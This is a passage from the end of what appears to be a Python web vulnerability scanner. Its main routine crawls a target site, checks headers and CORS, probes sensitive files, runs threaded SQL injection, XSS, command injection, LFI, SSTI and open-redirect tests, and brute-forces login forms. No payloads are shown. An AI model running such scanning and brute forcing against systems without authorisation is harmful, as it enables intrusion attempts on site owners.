{C}    SQLi | XSS | CMDi | LFI | SSTI | Redirect | CORS | Headers | Brute{RS}
"""

# ══════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════

def main():
    print(BANNER)
    t0 = time.time()

    log("SCAN", f"Target  → {TARGET}")
    log("SCAN", f"Threads → {THREADS} | Deep={DEEP} | Brute={BRUTE} | Depth={DEPTH}")

    log("SCAN","Checking headers, CORS, info leak...")
    check_headers()
    check_cors()
    check_info_leak(TARGET)

    log("SCAN","Probing sensitive files...")
    check_sensitive_files()

    log("SCAN","Crawling site...")
    all_urls, all_forms = crawl_site()
    param_urls = [u for u in all_urls if "?" in u]
    log("INFO", f"Crawled {len(all_urls)} URLs | {len(param_urls)} parametric | {len(all_forms)} forms")

    # ── injection tests (threaded) ────────────────
    log("SCAN", f"Running injection tests on {len(param_urls)} URLs...")

    url_queue = deque(param_urls)
    q_lock    = threading.Lock()

    def url_worker():
        while True:
            with q_lock:
                if not url_queue:
                    return
                url = url_queue.popleft()
            sqli_url(url)
            xss_url(url)
            cmdi_url(url)
            lfi_url(url)
            ssti_url(url)
            open_redirect_url(url)

    workers = [threading.Thread(target=url_worker, daemon=True) for _ in range(THREADS)]
    for w in workers:
        w.start()
    for w in workers:
        w.join()

    # ── form tests ────────────────────────────────
    log("SCAN", f"Testing {len(all_forms)} forms...")
    for form in all_forms:
        sqli_form(form)
        xss_form(form)

    # ── brute force ───────────────────────────────
    brute_force(all_forms)

    print_report(t0, len(all_urls), len(all_forms))

if __name__ == "__main__":
    main()
